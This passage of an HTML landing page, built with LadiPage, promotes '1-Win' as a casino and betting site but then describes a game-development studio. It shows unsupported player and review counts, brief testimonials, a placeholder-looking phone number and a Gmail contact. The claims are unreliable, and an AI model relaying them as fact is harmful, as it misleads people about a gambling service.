							<h3 class='ladi-headline ladi-transition'><span style="font-weight: bold;">1.000.000+</span>
							</h3>
						</div>
						<div id="SHAPE180" class='ladi-element'>
							<div class='ladi-shape ladi-transition'><svg xmlns="http://www.w3.org/2000/svg" width="100%"
									height="100%" preserveAspectRatio="none" viewBox="0 0 29.77 29.77"
									fill="rgba(235, 243, 255, 0.2)">
									<use xlink:href="#shape_LnMLZBVqKf"></use>
								</svg></div>
						</div>
						<div id="HEADLINE191" class='ladi-element'>
							<h3 class='ladi-headline ladi-transition'>Player</h3>
						</div>
					</div>
				</div>
				<div id="GROUP203" class='ladi-element'>
					<div class='ladi-group'>
						<div id="SHAPE181" class='ladi-element'>
							<div class='ladi-shape ladi-transition'><svg xmlns="http://www.w3.org/2000/svg" width="100%"
									height="100%" preserveAspectRatio="none" viewBox="0 0 134.5 134.5"
									fill="rgba(235, 243, 255, 0.1)">
									<use xlink:href="#shape_dYBAOLXKDx"></use>
								</svg></div>
						</div>
						<div id="HEADLINE192" class='ladi-element'>
							<h3 class='ladi-headline ladi-transition'><span style="font-weight: bold;">565.123</span>
							</h3>
						</div>
						<div id="SHAPE182" class='ladi-element'>
							<div class='ladi-shape ladi-transition'><svg xmlns="http://www.w3.org/2000/svg" width="100%"
									height="100%" preserveAspectRatio="none" viewBox="0 0 29.77 29.77"
									fill="rgba(235, 243, 255, 0.2)">
									<use xlink:href="#shape_LnMLZBVqKf"></use>
								</svg></div>
						</div>
						<div id="HEADLINE193" class='ladi-element'>
							<h3 class='ladi-headline ladi-transition'>Player reviews are satisfied</h3>
						</div>
					</div>
				</div>
				<div id="GROUP204" class='ladi-element'>
					<div class='ladi-group'>
						<div id="SHAPE183" class='ladi-element'>
							<div class='ladi-shape ladi-transition'><svg xmlns="http://www.w3.org/2000/svg" width="100%"
									height="100%" preserveAspectRatio="none" viewBox="0 0 134.5 134.5"
									fill="rgba(235, 243, 255, 0.1)">
									<use xlink:href="#shape_dYBAOLXKDx"></use>
								</svg></div>
						</div>
						<div id="HEADLINE194" class='ladi-element'>
							<h3 class='ladi-headline ladi-transition'><span style="font-weight: bold;">35.506</span>
							</h3>
						</div>
						<div id="SHAPE184" class='ladi-element'>
							<div class='ladi-shape ladi-transition'><svg xmlns="http://www.w3.org/2000/svg" width="100%"
									height="100%" preserveAspectRatio="none" viewBox="0 0 29.77 29.77"
									fill="rgba(235, 243, 255, 0.2)">
									<use xlink:href="#shape_LnMLZBVqKf"></use>
								</svg></div>
						</div>
						<div id="HEADLINE195" class='ladi-element'>
							<h3 class='ladi-headline ladi-transition'>Reviews</h3>
						</div>
					</div>
				</div>
				<div id="HEADLINE223" class='ladi-element'>
					<h3 class='ladi-headline ladi-transition'></h3>
				</div>
				<div id="HEADLINE224" class='ladi-element'>
					<h3 class='ladi-headline ladi-transition'>Having a strong track record of achievements, our company
						is pleased to impart its knowledge and expertise to you.</h3>
				</div>
				<div id="HEADLINE229" class='ladi-element'>
					<h3 class='ladi-headline ladi-transition'>VIEW STATISTICS</h3>
				</div>
			</div>
		</div>
		<div id="SECTION174" class='ladi-section'>
			<div class='ladi-section-background'></div>
			<div class="ladi-container">
				<div id="GROUP231" class='ladi-element'>
					<div class='ladi-group'>
						<div id="BOX198" class='ladi-element'>
							<div class='ladi-box ladi-transition'>
								<div class="ladi-overlay"></div>
							</div>
						</div>
						<div id="BOX199" class='ladi-element'>
							<div class='ladi-box ladi-transition'></div>
						</div>
					</div>
				</div>
				<div id="IMAGE172" class='ladi-element'>
					<div class='ladi-image ladi-transition'>
						<div class="ladi-image-background"></div>
					</div>
				</div>
				<div id="HEADLINE226" class='ladi-element'>
					<h3 class='ladi-headline ladi-transition'>1-WIN: WHERE ONLINE GAMING EXCITEMENT AWAITS!</h3>
				</div>
				<div data-action="true" id="BUTTON174" class='ladi-element'>
					<div class='ladi-button ladi-transition'>
						<div class="ladi-button-background"></div>
						<div id="BUTTON_TEXT174" class='ladi-element ladi-button-headline'>
							<p class='ladi-headline ladi-transition'>Experience now</p>
						</div>
					</div>
				</div>
				<div id="PARAGRAPH173" class='ladi-element'>
					<div class='ladi-paragraph ladi-transition'><span style="color: rgb(241, 196, 15);">1-WIN</span>:
						WHERE ONLINE GAMING EXCITEMENT AWAITS!<br>In the dynamic realm of online entertainment, enthusiasts of gaming are forever in search of heightened excitement and involvement. Your quest concludes here, as 1-Win emerges as your unmatched portal to an arena teeming with electrifying online gaming encounters. Encompassing a wide spectrum of choices that encompass casino games, sports betting, e-sports, and beyond,
						<span style="font-weight: bold;">1-Win</span> assures a pulse-pounding journey tailored to
						players of diverse inclinations.<br><br><br></div>
					</div>
					<div id="PARAGRAPH174" class='ladi-element'>
						<div class='ladi-paragraph ladi-transition'>
							<span style="font-weight: bold;">Exploring Our Offerings:</span><br>Gaming Expertise Redefined: At
							<span style="color: rgb(241, 196, 15);">1-Win</span>, Mastery lies in our ability to turn
							concepts into enthralling gaming universes. Our experienced cadre of game developers
							possesses an unparalleled understanding of player inclinations and market movements. Whether
							crafting adrenaline-pumping action sagas or intricate mental challenges, we intricately mold
							gameplay mechanics, visuals, and stories to resonate with your target demographic,
							guaranteeing optimal player immersion.</div>
					</div>
					<div id="PARAGRAPH175" class='ladi-element'>
						<div class='ladi-paragraph ladi-transition'>
							<span style="font-weight: bold;">Immersive Narrative Craftsmanship</span>:<br>&nbsp;Narratives constitute the heart of extraordinary games. Our adept storytellers are virtuosos in crafting gripping and captivating storylines. We weave complex narratives, crafting realms that players can effortlessly immerse themselves in, where their decisions wield the ability to redefine their path. Through
							<span style="color: rgb(241, 196, 15);">1-Win</span>, your game transforms into a vibrant,
							dynamic chronicle, with players as essential contributors.</div>
					</div>
					<div id="PARAGRAPH176" class='ladi-element'>
						<div class='ladi-paragraph ladi-transition'>
							<span style="font-weight: bold;">Cutting-edge Graphics and Animation: <br></span>Prepare for
							an astonishing visual expedition. Our team of artists and animators meticulously craft
							realistic characters, breathtaking landscapes, and seamless animations that dissolve the
							line between reality and digital craftsmanship. The result? Games that not only offer
							exceptional gameplay but also showcase a stunning visual marvel.</div>
					</div>
					<div id="PARAGRAPH177" class='ladi-element'>
						<div class='ladi-paragraph ladi-transition'>
							<span style="font-weight: bold;">Innovative Multimedia Applications: <br></span>Beyond
							gaming, we pioneer the creation of multimedia applications that enhance people's lives.
							Ranging from interactive educational utilities to captivating augmented reality encounters,
							our proficiency covers a wide array. We harness the power of technology to craft
							applications that bring entertainment, education, and enriched user experiences to the
							forefront.</div>
					</div>
					<div id="PARAGRAPH178" class='ladi-element'>
						<div class='ladi-paragraph ladi-transition'>
							<span style="font-weight: bold;">Seamless Cross-platform Execution: <br></span>In an age
							characterized by a variety of platforms, our technical expertise shines prominently. We
							design games and applications that smoothly adapt to different devices, guaranteeing a
							consistent experience on personal computers, gaming consoles, mobile devices, and more. Our
							proficiency in cross-platform development ensures that your creation achieves its utmost
							potential across the digital terrain.</div>
					</div>
					<div id="IMAGE173" class='ladi-element'>
						<div class='ladi-image'>
							<div class="ladi-image-background"></div>
						</div>
					</div>
					<div id="IMAGE174" class='ladi-element'>
						<div class='ladi-image'>
							<div class="ladi-image-background"></div>
						</div>
					</div>
					<div id="IMAGE175" class='ladi-element'>
						<div class='ladi-image'>
							<div class="ladi-image-background"></div>
						</div>
					</div>
					<div id="IMAGE176" class='ladi-element'>
						<div class='ladi-image'>
							<div class="ladi-image-background"></div>
						</div>
					</div>
					<div id="IMAGE177" class='ladi-element'>
						<div class='ladi-image'>
							<div class="ladi-image-background"></div>
						</div>
					</div>
					<div id="PARAGRAPH179" class='ladi-element'>
						<div class='ladi-paragraph ladi-transition'>Embark on a journey through boundless creativity and
							innovation alongside 1-Win. Step into a world where creativity and innovation have no bounds
							with 1-Win. Our commitment to game development and multimedia applications goes beyond
							technology; it's about creating emotions, experiences, and memories that endure even after
							the screen fades. Partner with us to shape the future of entertainment—a realm where
							imagination is limitless, and every click, touch, and interaction reveals untapped
							possibilities. Through 1-Win, your ideas transform from mere thoughts into vibrant,
							pulsating realities.</div>
					</div>
				</div>
			</div>
			<div id="SECTION42" class='ladi-section'>
				<div class='ladi-section-background'></div>
				<div class="ladi-container">
					<div id="HEADLINE43" class='ladi-element'>
						<h3 class='ladi-headline'>COMMENT</h3>
					</div>
					<div id="GROUP45" class='ladi-element'>
						<div class='ladi-group'>
							<div id="PARAGRAPH47" class='ladi-element'>
								<div class='ladi-paragraph'>1-Win's online multiplayer games stand out as among the
									finest in the industry, playing a role in fostering close-knit communities and
									enduring friendships among players.<br></div>
								</div>
								<div id="PARAGRAPH48" class='ladi-element'>
									<div class='ladi-paragraph'>Mr. Abur</div>
								</div>
							</div>
						</div>
						<div id="GROUP50" class='ladi-element'>
							<div class='ladi-group'>
								<div id="BOX51" class='ladi-element'>
									<div class='ladi-box'></div>
								</div>
								<div id="PARAGRAPH52" class='ladi-element'>
									<div class='ladi-paragraph'>"The variety of genres that this company covers is
										impressive."</div>
								</div>
								<div id="PARAGRAPH53" class='ladi-element'>
									<div class='ladi-paragraph'>San kayta</div>
								</div>
							</div>
						</div>
						<div id="GROUP55" class='ladi-element'>
							<div class='ladi-group'>
								<div id="BOX56" class='ladi-element'>
									<div class='ladi-box'></div>
								</div>
								<div id="PARAGRAPH57" class='ladi-element'>
									<div class='ladi-paragraph'>"The game graphics and visuals from this company are
										truly astonishing. 1-Win consistently pushes the limits of what's achievable in
										PC gaming, delivering a stunning experience with every playthrough."<br></div>
									</div>
									<div id="PARAGRAPH58" class='ladi-element'>
										<div class='ladi-paragraph'>KoHait Jr</div>
									</div>
								</div>
							</div>
							<div id="BOX201" class='ladi-element'>
								<div class='ladi-box ladi-transition'></div>
							</div>
						</div>
					</div>
					<div id="SECTION60" class='ladi-section'>
						<div class='ladi-section-background'></div>
						<div class="ladi-container">
							<div id="HEADLINE61" class='ladi-element'>
								<h3 class='ladi-headline'>ACCOMPANYING PARTNERS</h3>
							</div>
							<div id="IMAGE63" class='ladi-element'>
								<div class='ladi-image'>
									<div class="ladi-image-background"></div>
								</div>
							</div>
							<div id="IMAGE64" class='ladi-element'>
								<div class='ladi-image'>
									<div class="ladi-image-background"></div>
								</div>
							</div>
							<div id="IMAGE65" class='ladi-element'>
								<div class='ladi-image'>
									<div class="ladi-image-background"></div>
								</div>
							</div>
							<div id="IMAGE66" class='ladi-element'>
								<div class='ladi-image'>
									<div class="ladi-image-background"></div>
								</div>
							</div>
							<div id="IMAGE67" class='ladi-element'>
								<div class='ladi-image'>
									<div class="ladi-image-background"></div>
								</div>
							</div>
						</div>
					</div>
					<div id="SECTION76" class='ladi-section'>
						<div class='ladi-section-background'></div>
						<div class="ladi-container">
							<div id="GROUP194" class='ladi-element'>
								<div class='ladi-group'>
									<div id="HEADLINE79" class='ladi-element'>
										<h1 class='ladi-headline'>Contact</h1>
									</div>
									<div id="HEADLINE80" class='ladi-element'>
										<h6 class='ladi-headline'>Office</h6>
									</div>
									<div id="GROUP81" class='ladi-element'>
										<div class='ladi-group'>
											<div id="SHAPE82" class='ladi-element'>
												<div class='ladi-shape'><svg xmlns="http://www.w3.org/2000/svg"
														xmlns:xlink="http://www.w3.org/1999/xlink" width="100%"
														height="100%" viewBox="0 0 24 24" fill="rgba(150,150,150,1)">
														<path
															d="M12,11.5A2.5,2.5 0 0,1 9.5,9A2.5,2.5 0 0,1 12,6.5A2.5,2.5 0 0,1 14.5,9A2.5,2.5 0 0,1 12,11.5M12,2A7,7 0 0,0 5,9C5,14.25 12,22 12,22C12,22 19,14.25 19,9A7,7 0 0,0 12,2Z">
														</path>
													</svg></div>
											</div>
											<div id="PARAGRAPH83" class='ladi-element'>
												<div class='ladi-paragraph'>11 College Rd, Alum Rock, Birmingham B8 3SH,
													United Kingdom</div>
											</div>
										</div>
									</div>
									<div id="GROUP84" class='ladi-element'>
										<div class='ladi-group'>
											<div id="SHAPE85" class='ladi-element'>
												<div class='ladi-shape'><svg xmlns="http://www.w3.org/2000/svg"
														xmlns:xlink="http://www.w3.org/1999/xlink" width="100%"
														height="100%" viewBox="0 0 24 24" fill="rgba(150,147,147,1)">
														<path
															d="M6.62,10.79C8.06,13.62 10.38,15.94 13.21,17.38L15.41,15.18C15.69,14.9 16.08,14.82 16.43,14.93C17.55,15.3 18.75,15.5 20,15.5A1,1 0 0,1 21,16.5V20A1,1 0 0,1 20,21A17,17 0 0,1 3,4A1,1 0 0,1 4,3H7.5A1,1 0 0,1 8.5,4C8.5,5.25 8.7,6.45 9.07,7.57C9.18,7.92 9.1,8.31 8.82,8.59L6.62,10.79Z">
														</path>
													</svg></div>
											</div>
											<div id="PARAGRAPH86" class='ladi-element'>
												<div class='ladi-paragraph'>Hotline: +44 20 1231 1234</div>
											</div>
										</div>
									</div>
									<div id="GROUP87" class='ladi-element'>
										<div class='ladi-group'>
											<div id="SHAPE88" class='ladi-element'>
												<div class='ladi-shape'><svg xmlns="http://www.w3.org/2000/svg"
														xmlns:xlink="http://www.w3.org/1999/xlink" width="100%"
														height="100%" viewBox="0 0 24 24" fill="rgba(153,144,144,1)">
														<path
															d="M20,8L12,13L4,8V6L12,11L20,6M20,4H4C2.89,4 2,4.89 2,6V18A2,2 0 0,0 4,20H20A2,2 0 0,0 22,18V6C22,4.89 21.1,4 20,4Z">
														</path>
													</svg></div>
											</div>
											<div id="PARAGRAPH89" class='ladi-element'>
												<div class='ladi-paragraph'>Email: ancokeag@gmail.com</div>
											</div>
										</div>
									</div>
									<div id="HEADLINE90" class='ladi-element'>
										<h6 class='ladi-headline'></h6>
									</div>
									<div id="GROUP91" class='ladi-element'>
										<div class='ladi-group'>
											<div id="SHAPE92" class='ladi-element'>
												<div class='ladi-shape'><svg xmlns="http://www.w3.org/2000/svg"
														xmlns:xlink="http://www.w3.org/1999/xlink" width="100%"
														height="100%" viewBox="0 0 24 24" fill="rgba(128,128,128,1)">
														<path
															d="M17,2V2H17V6H15C14.31,6 14,6.81 14,7.5V10H14L17,10V14H14V22H10V14H7V10H10V6A4,4 0 0,1 14,2H17Z">
														</path>
													</svg></div>
											</div>
											<div id="SHAPE93" class='ladi-element'>
												<div class='ladi-shape'><svg xmlns="http://www.w3.org/2000/svg"
														xmlns:xlink="http://www.w3.org/1999/xlink" width="100%"
														height="100%" viewBox="0 0 24 24" fill="rgba(128,128,128,1)">
														<path
															d="M10,16.5V7.5L16,12M20,4.4C19.4,4.2 15.7,4 12,4C8.3,4 4.6,4.19 4,4.38C2.44,4.9 2,8.4 2,12C2,15.59 2.44,19.1 4,19.61C4.6,19.81 8.3,20 12,20C15.7,20 19.4,19.81 20,19.61C21.56,19.1 22,15.59 22,12C22,8.4 21.56,4.91 20,4.4Z">
														</path>
													</svg></div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div id="SECTION176" class='ladi-section'>
						<div class='ladi-section-background'></div>
						<div class="ladi-container">
							<div id="HTML_CODE172" class='ladi-element'>
								<div class='ladi-html-code'><iframe
										src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d2429.52981647052!2d-1.8530750517630015!3d52.487648399071986!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x4870bb12490acb77%3A0xf4d1ae7c110b36b1!2s11%20College%20Rd%2C%20Alum%20Rock%2C%20Birmingham%20B8%203SH%2C%20V%C6%B0%C6%A1ng%20Qu%E1%BB%91c%20Anh!5e0!3m2!1svi!2sus!4v1697428553796!5m2!1svi!2sus"
										width="100%" height="100%" style="border:0;" allowfullscreen="" loading="lazy"
										referrerpolicy="no-referrer-when-downgrade"></iframe></div>
							</div>
						</div>
					</div>
					<div id="SECTION175" class='ladi-section'>
						<div class='ladi-section-background'></div>
						<div class="ladi-container"><a href="https://www.1win-01.com/privacy-policy" id="PARAGRAPH184"
								class='ladi-element'>
								<div class='ladi-paragraph'>Privacy policy</div>
							</a><a href="https://www.1win-01.com/disclaimer" id="PARAGRAPH186" class='ladi-element'>
								<div class='ladi-paragraph'>Disclaimer</div>
							</a><a href="https://www.1win-01.com/terms-conditions" id="PARAGRAPH185"
								class='ladi-element'>
								<div class='ladi-paragraph'>Terms &amp; Conditions</div>
							</a></div>
					</div>
				</div>
				<div id="backdrop-popup" class="backdrop-popup"></div>
				<div id="backdrop-dropbox" class="backdrop-dropbox"></div>
				<div id="lightbox-screen" class="lightbox-screen"></div>
				<script id="script_lazyload" type="text/javascript">
					window.lazyload_run = function (dom, is_first, check_dom_rect) {if (check_dom_rect && (document.body.clientWidth <= 0 || document.body.clientheight <= 0)) {return setTimeout(function () {window.lazyload_run(dom, is_first, check_dom_rect);}, 1);}var style_lazyload = document.getElementById('style_lazyload');var list_element_lazyload = dom.querySelectorAll('body.lazyload .ladi-overlay, body.lazyload .ladi-box, body.lazyload .ladi-button-background, body.lazyload .ladi-collection-item, body.lazyload .ladi-countdown-background, body.lazyload .ladi-form-item-background, body.lazyload .ladi-form-label-container .ladi-form-label-item.image, body.lazyload .ladi-frame-background, body.lazyload .ladi-gallery-view-item, body.lazyload .ladi-gallery-control-item, body.lazyload .ladi-headline, body.lazyload .ladi-image-background, body.lazyload .ladi-image-compare, body.lazyload .ladi-list-paragraph ul li, body.lazyload .ladi-section-background, body.lazyload .ladi-survey-option-background, body.lazyload .ladi-survey-option-image, body.lazyload .ladi-tabs-background, body.lazyload .ladi-video-background, body.lazyload .ladi-banner, body.lazyload .ladi-spin-lucky-screen, body.lazyload .ladi-spin-lucky-start');var docEventScroll = window;for (var i = 0; i < list_element_lazyload.length; i++) {var rect = list_element_lazyload[i].getBoundingClientRect();if (rect.x == "undefined" || rect.x == undefined || rect.y == "undefined" || rect.y == undefined) {rect.x = rect.left;rect.y = rect.top;}var offset_top = rect.y + window.scrollY;if (offset_top >= window.scrollY + window.innerHeight || window.scrollY >= offset_top + list_element_lazyload[i].offsetHeight) {list_element_lazyload[i].classList.add('ladi-lazyload');}}if (typeof style_lazyload != "undefined" && style_lazyload != undefined) {style_lazyload.parentElement.removeChild(style_lazyload);}document.body.classList.remove("lazyload");var currentScrollY = window.scrollY;var stopLazyload = function (event) {if (event.type == "scroll" && window.scrollY == currentScrollY) {currentScrollY = -1;return;}docEventScroll.removeEventListener('scroll', stopLazyload);list_element_lazyload = document.getElementsByClassName('ladi-lazyload');while(list_element_lazyload.length > 0) {list_element_lazyload[0].classList.remove('ladi-lazyload');}};if (is_first) {var scrollEventPassive = null;try {var opts = Object.defineProperty({}, 'passive', {get: function() {scrollEventPassive = {passive: true};}});window.addEventListener('testPassive', null, opts);window.removeEventListener('testPassive', null, opts);} catch (e) {}docEventScroll.addEventListener('scroll', stopLazyload, scrollEventPassive);}return dom;}; window.lazyload_run(document, true, true);
				</script>
				<!--[if lt IE 9]><script src="https://w.ladicdn.com/v2/source/html5shiv.min.js?v=1698827959206"></script><script src="https://w.ladicdn.com/v2/source/respond.min.js?v=1698827959206"></script><![endif]-->
				<link
					href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;700&family=Roboto+Slab:wght@400;700&family=Roboto:wght@400;700&display=swap"
					rel="stylesheet" type="text/css">
				<script src="https://w.ladicdn.com/v2/source/ladipagev3.min.js?v=1698827959206" type="text/javascript">
				</script>
				<script id="script_event_data" type="application/json">
					{"SECTION2":{"a":"section","cf":"https://s.ladicdn.com/64679654cd117e00202ffd8c/video-720p-20231030025227-fowfm.mp4","ce":"direct","d":"video"},"BUTTON173":{"a":"button","cs":[{"dr":"action","dw":"+44 20 1231 1234","a":"phone"}]},"BUTTON174":{"a":"button","cs":[{"dw":"SECTION145","dr":"action","a":"section"}]},"PARAGRAPH184":{"a":"paragraph","cs":[{"dr":"action","dv":"_self","dw":"https://www.1win-01.com/privacy-policy","a":"link"}]},"PARAGRAPH185":{"a":"paragraph","cs":[{"dr":"action","dv":"_self","dw":"https://www.1win-01.com/terms-conditions","a":"link"}]},"PARAGRAPH186":{"a":"paragraph","cs":[{"dr":"action","dv":"_self","dw":"https://www.1win-01.com/disclaimer","a":"link"}]}}
				</script>
				<script id="script_ladipage_run" type="text/javascript">
					(function () {var run = function () {if (typeof window.LadiPageScript == "undefined" || typeof window.ladi == "undefined" || window.ladi == undefined) {setTimeout(run, 100); return;}window.LadiPageApp = window.LadiPageApp || new window.LadiPageAppV2();window.LadiPageScript.runtime.ladipage_id = '6542442383024a0012e4b68d';window.LadiPageScript.runtime.publish_platform = 'LADIPAGEDNS';window.LadiPageScript.runtime.version = '1698827959206';window.LadiPageScript.runtime.cdn_url = 'https://w.ladicdn.com/v2/source/';window.LadiPageScript.runtime.DOMAIN_SET_COOKIE = ["1win-01.com"];window.LadiPageScript.runtime.DOMAIN_FREE = ["preview.ladipage.me","ldp.link","ldp.page"];window.LadiPageScript.runtime.bodyFontSize = 12;window.LadiPageScript.runtime.store_id = "64679654cd117e00202ffd8c";window.LadiPageScript.runtime.time_zone = 7;window.LadiPageScript.runtime.currency = "VND";window.LadiPageScript.runtime.convert_replace_str = true;window.LadiPageScript.runtime.desktop_width = 960;window.LadiPageScript.runtime.mobile_width = 420;window.LadiPageScript.runtime.tracking_button_click = true;window.LadiPageScript.runtime.lang = "vi";window.LadiPageScript.run(true);window.LadiPageScript.runEventScroll();};run();})();
				</script>
</body>

</html>
<!--Publish time: Wed, 01 Nov 2023 12:33:34 GMT-->
<!--LadiPage build time: Wed, 01 Nov 2023 08:39:19 GMT-->